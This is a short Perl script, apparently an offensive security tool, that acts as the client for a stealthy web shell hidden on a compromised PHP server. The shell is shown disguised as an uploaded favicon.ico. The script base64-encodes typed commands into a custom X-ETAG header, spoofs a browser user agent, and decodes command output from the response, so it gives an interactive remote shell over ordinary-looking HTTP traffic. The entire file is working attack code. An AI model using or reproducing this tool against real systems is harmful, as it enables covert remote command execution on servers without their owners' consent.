#!/usr/bin/perl
# Interface for the mod_php htaccess stealth shell
# Written by Wireghoul - http://www.justanotherhacker.com

use warnings;
use strict;
use MIME::Base64;
use LWP::UserAgent;

&usage unless $ARGV[0];
my $url = $ARGV[0];
pop(@ARGV); #keep readline happy
my $ua = LWP::UserAgent->new;
$ua->agent('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16');

sub usage {
    print "Usage: $0 url\nExample: $0 http://vuln.com/upload/favicon.ico\n";
    exit 2;
}

my $cmd = '';
print "Connecting to shell at $url - type 'exit' to exit";
until ($cmd eq 'exit') {
    print "\nshell> ";
    $cmd = readline;
    chomp $cmd;
    my $payload = 'AA'.encode_base64($cmd);
    my $response = $ua->get( $url, 'X-ETAG' => $payload);
    if ($response->header('X-ETAG')) {
      print decode_base64(substr($response->header('X-ETAG'),2));
    } else {
      print "Error! No payload in response!\n";
    }
}
